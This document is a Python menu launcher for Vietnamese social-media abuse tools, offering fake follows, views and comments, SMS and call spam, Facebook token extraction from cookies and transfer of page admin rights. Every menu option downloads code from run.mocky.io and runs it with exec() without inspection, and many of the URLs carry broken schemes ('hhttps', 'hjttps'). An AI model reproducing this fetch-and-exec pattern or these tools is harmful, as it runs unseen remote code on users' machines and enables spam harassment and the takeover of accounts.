import os,sys
import requests,json
from time import sleep
from datetime import datetime, timedelta
import base64,requests,os
#màu
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb="\033[1;37m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
import os, sys
import requests
import os, sys
import time
from time import strftime
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
ip = requests.post('https://api.proxyscrape.com/ip.php').text
# Copyright
ndp_tool="\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=>  "
Cyraxmod = "\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
#Config
__ZALO__ = '0884152630'
__ADMIN__ = 'D ONE'
__FACEBOOK__ = 'Crush'
__VERSION__ = '1.0'
def banner():
 banner = f"""
\033[1;35m                         ¶¶¶¶¶¶
\033[1;37m                        ¶¶¶¶¶¶¶¶
\033[1;35m                       ¶¶¶¶¶¶¶¶¶¶
\033[1;37m                      ¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;35m                      ¶¶¶¶__¶_¶¶¶¶
\033[1;37m                      ¶¶¶__¶___¶¶¶
\033[1;35m                      ¶¶¶___¶¶_¶¶¶
\033[1;37m                      ¶¶¶¶____¶¶¶¶
\033[1;35m                      ¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;37m                       ¶¶_¶¶¶¶_¶¶
\033[1;35m                       ¶¶_¶¶¶¶_¶¶
\033[1;37m                       ¶¶_¶¶¶¶_¶¶
\033[1;35m                       ¶¶_¶¶¶¶_¶¶
\033[1;37m                       ¶¶_¶¶¶¶_¶¶
\033[1;35m                       ¶¶_¶¶¶¶_¶¶
\033[1;37m                       ¶¶_¶¶¶¶_¶¶
\033[1;35m_¶¶_¶¶¶¶_¶¶______________________________________¶¶ ¶¶¶¶ ¶¶
                        \033[1;35mC\033[1;37mA\033[1;31mM\033[1;36mB\033[1;39mO\033[1;34mD\033[1;37mI\033[1;32mA
\033[1;37m_¶¶_¶¶¶¶_¶¶______________________________________¶¶ ¶¶¶¶ ¶¶
\033[1;35m_¶¶_¶¶¶¶_¶¶____¶____¶____¶____¶____¶____¶____¶___¶¶ ¶¶¶¶ ¶¶
\033[1;37m_¶¶_¶¶¶¶_¶¶___¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶_¶¶¶ ¶¶¶¶ ¶¶
\033[1;35m_¶¶_¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶ ¶¶
\033[1;37m_¶¶_¶¶¶¶_¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶ ¶¶¶¶ ¶¶
\033[1;35m_¶¶_¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶ ¶¶
\033[1;37m_¶¶_¶¶¶¶_¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶ ¶¶¶¶ ¶¶
\033[1;35m_¶¶_¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶ ¶¶
\033[1;37m_¶¶_¶¶¶¶_¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶ ¶¶¶¶ ¶¶
\033[1;35m_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;31m────────────────────────────────────────────────────────────
\033[1;31m[\033[1;37m=)\033[1;31m] \033[1;37m=> \033[1;33mMulti-functional integration TOOL BY : CYRAXMOD 
\033[1;31m[\033[1;37m=)\033[1;31m] \033[1;37m=> \033[1;35mADMIN : \033[1;36mD ONE
\033[1;31m[\033[1;37m=)\033[1;31m] \033[1;37m=> \033[1;36mFB\033[1;31m    : CRUSH 
\033[1;31m[\033[1;37m=)\033[1;31m] \033[1;37m=> \033[1;32mBOX SUPPORT ADMIN: T.ME/DeveloperTiktok016
\033[1;31m[\033[1;37m=)\033[1;31m] \033[1;37m=> \033[1;34mGROUP:\033[1;37mT.ME/ShareToolBuffViewTikTok
\033[1;31m"""
 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.00125) 
os.system("cls" if os.name == "nt" else "clear")
banner()
sleep(1)
print("\033[1;37m╔═════════════════════╗")
print("\033[1;37m║  \033[1;33mTool Trao Đoi Sub  \033[1;37m║")
print("\033[1;37m╚═════════════════════╝")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m1\033[1;31m] \033[1;35mTool TDS Fb Full Job ")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m2\033[1;31m] \033[1;35mTool TDS Pro5 ")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m3\033[1;31m] \033[1;35mTool TDS Pro5 Multi-stream ")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m4\033[1;31m] \033[1;35mTool TDS Fb VIP ")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m5\033[1;31m] \033[1;35mTool TDS Tiktok ")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m6\033[1;31m] \033[1;35mTool TDS INSTAGRAM MAX SPEED ")
print("\033[1;31m────────────────────────────────────────────────────────────")
print("\033[1;37m╔═══════════════════════╗")
print("\033[1;37m║  \033[1;33mTool Tuong Tac Cheo  \033[1;37m║")
print("\033[1;37m╚═══════════════════════╝")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m7\033[1;31m] \033[1;35mTool TTC Pro5 V1 ")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m8\033[1;31m] \033[1;35mTool TTC Pro5 V2 ")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m9\033[1;31m] \033[1;35mTool TTC Instagram Vipig \033[1;31m(Update)")
print("\033[1;31m────────────────────────────────────────────────────────────")
print("\033[1;37m╔═════════════════════╗")
print("\033[1;37m║  \033[1;33mTien ich Facebook  \033[1;37m║")
print("\033[1;37m╚═════════════════════╝")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m10\033[1;31m] \033[1;35mTool REG PAGE PRO5 ")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m11\033[1;31m] \033[1;35mTool GET TOKEN PAGE PRO5 ")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m12\033[1;31m] \033[1;35mTool GET TOKEN FULL Permissions from cookies ")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m13\033[1;31m] \033[1;35mTool Transfer page management rights \033[1;31m(Update)")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m14\033[1;31m] \033[1;35mTool REG PAGE LOCATION \033[1;31m(Update) ")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m15\033[1;31m] \033[1;35mTool Transfer PAGE Vi TRi + UP AVATAR \033[1;31m(Update) ")
print("\033[1;31m────────────────────────────────────────────────────────────")
print("\033[1;37m╔═════════════════════╗")
print("\033[1;37m║  \033[1;33mTool BUFF          \033[1;37m║")
print("\033[1;37m╚═════════════════════╝")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m16\033[1;31m] \033[1;35mTool BUFF Follow Using PRO5 Page  ")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m17\033[1;31m] \033[1;35mTool BUFF CMT PRO5 ")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m18\033[1;31m] \033[1;35mTool BUFF VIEW STORY PRO5 ")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m19\033[1;31m] \033[1;35mTool BUFF FEElINGS STORY PRO5")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m20\033[1;31m] \033[1;35mTool BUFF MEM GROUP PRO5\033[1;31m(Update) ")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;34mEnter number \033[1;31m[\033[1;33m21\033[1;31m] \033[1;35mTool BUFF VIEW TIKTOK")
print("\033[1;31m────────────────────────────────────────────────────────────")
print("\033[1;37m╔═════════════════════╗")
print("\033[1;37m║  \033[1;33mTool Share FB + Spam\033[1;37m║")
print("\033[1;37m╚═════════════════════╝")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;35mEnter number \033[1;31m[\033[1;33m22\033[1;31m] \033[1;35mTool SHARE FB \033[1;36m(New Delay 1) ")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;35mEmter number \033[1;31m[\033[1;33m23\033[1;31m] \033[1;35mTool SHARE FB MAX SPEED \033[1;31m(Update) ")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;35mEnter number \033[1;31m[\033[1;33m24\033[1;31m] \033[1;35mTool SHARE FB v2 \033[1;31m(Update)")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;35mEnter number \033[1;31m[\033[1;33m25\033[1;31m] \033[1;35mTool SPAM SMS VA CALL V1\033[1;31m(Update) ")
print("\033[1;35m[\033[1;37m>.<\033[1;36m] \033[1;37m=> \033[1;35mEnter number \033[1;31m[\033[1;33m26\033[1;31m] \033[1;35mTool SPAM SMS VA CALL V2 \033[1;31m(Update) ")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;35mEnter number \033[1;31m[\033[1;33m27\033[1;31m] \033[1;35mTool SPAM SMS VA CALL V3 \033[1;31m(Update)")
print("\033[1;36m[\033[1;37m>.<\033[1;35m] \033[1;37m=> \033[1;35mEnter number \033[1;31m[\033[1;33m28\033[1;31m] \033[1;35mTool Buff View Tiktok (Proxy) ")
print("\033[1;31m────────────────────────────────────────────────────────────")
chon = int(input('\033[1;31m[\033[1;37m>.<\033[1;31m] \033[1;37m=> \033[1;32mEnter number \033[1;37m: \033[1;33m'))
if chon == 1 :
	exec(requests.get('hhttps://run.mocky.io/v3/84a51c3c-3921-4ae7-a094-8ed43ada2e07').text)
if chon == 2 :
	exec(requests.get('hhttps://run.mocky.io/v3/0f6cde73-c1c6-4fa8-bab2-8915b22680a8').text)
if chon == 3 :
	exec(requests.get('hhttps://run.mocky.io/v3/48dc1455-75ac-47b9-b1d1-f749dd5b1176').text)
if chon == 4 :
	exec(requests.get('hhttps://run.mocky.io/v3/045fed81-4580-43c9-8af4-aae8bdf8a898').text)
if chon == 5 :
	exec(requests.get('hhttps://run.mocky.io/v3/a4b5a32f-3b9a-4410-81d0-709266d21e31').text)
elif chon == 6 :
	exec(requests.get('hhttps://run.mocky.io/v3/bc3bc50a-e1be-4fe5-ba41-36bf5bd7b106').text)
if chon == 7 :
	exec(requests.get('hjttps://run.mocky.io/v3/6a205a8e-f595-4b17-99f3-6151a2d832ca').text)
if chon == 8 :
	exec(requests.get('hhttps://run.mocky.io/v3/240411d8-2313-49e8-a24d-3c7404141db8').text)
if chon == 9 :
	exec(requests.get('hhttps://run.mocky.io/v3/d83425fa-3c2a-49f9-92aa-2fe36bbca839').text)
if chon == 10 :
	exec(requests.get('https://run.mocky.io/v3/b2f5223d-693c-4c38-a621-96cfdaab9dbf').text)
if chon == 11 :
	exec(requests.get('https://run.mocky.io/v3/ae588f88-fcdc-41b5-93b5-555253b8210e').text)
if chon == 12 :
	exec(requests.get('https://run.mocky.io/v3/68677a2e-e0c1-4294-86cd-a4e946f41744').text)
if chon == 13 :
	exec(requests.get('hhttps://run.mocky.io/v3/9ce21daa-7e94-4441-b513-273867f7ef2c').text)
if chon == 14 :
	exec(requests.get('hhttps://run.mocky.io/v3/035187ad-7608-4724-b435-c3a7e4042d8b').text)
if chon == 15 :
	exec(requests.get('hhttps://run.mocky.io/v3/d8a4f077-f7f1-41ce-b5ee-4ad2d4006707').text)
if chon == 16 :
	exec(requests.get('https://run.mocky.io/v3/0415da0a-62bb-47ab-8310-9fe527d04341').text)
if chon == 17 :
	exec(requests.get('https://run.mocky.io/v3/885b3c95-9734-469d-aa11-d275105c5e43').text)
elif chon == 18 :
	exec(requests.get('https://run.mocky.io/v3/6e6b63ee-2bc6-4529-b9b8-20905dfc59e9').text)
elif chon == 19 :
	exec(requests.get('https://run.mocky.io/v3/7e5a0f14-2706-4017-b5f5-96202395ad4e').text)
elif chon == 20 :
	exec(requests.get('hhttps://run.mocky.io/v3/4084effb-070e-4292-8eec-0a511fa8f9ca').text)
elif chon == 21 :
 exec(requests.get('https://run.mocky.io/v3/c904fef8-2cfd-4509-a3c3-87516ab353b8').text)
elif chon == 22 :
 exec(requests.get('https://run.mocky.io/v3/a604c7de-ccf6-478b-9a16-3108ef3ce4e3').text)
elif chon == 23 :
 exec(requests.get('hhttps://run.mocky.io/v3/b3d61829-b1b0-4e98-8d6a-a455f586ac68').text)
elif chon == 24 :
 exec(requests.get('hhttps://run.mocky.io/v3/9c10b11d-8429-40f7-b563-0629f8fff86b').text)
if chon == 25 :
	exec(requests.get('hhttps://run.mocky.io/v3/09341862-6b56-4fd9-9207-354e3d0d3693').text)
if chon == 26 :
	exec(requests.get('hhttps://run.mocky.io/v3/304fe2a2-b214-4fe8-8271-172c93575ea7').text)
if chon == 27 :
	exec(requests.get('hhttps://run.mocky.io/v3/2c090b12-4228-4634-957c-47f9ae1747b3').text)
if chon == 28 :
	exec(requests.get('https://run.mocky.io/v3/923b8501-8ea4-47ba-b715-24439363d771').text)
else :
	exit()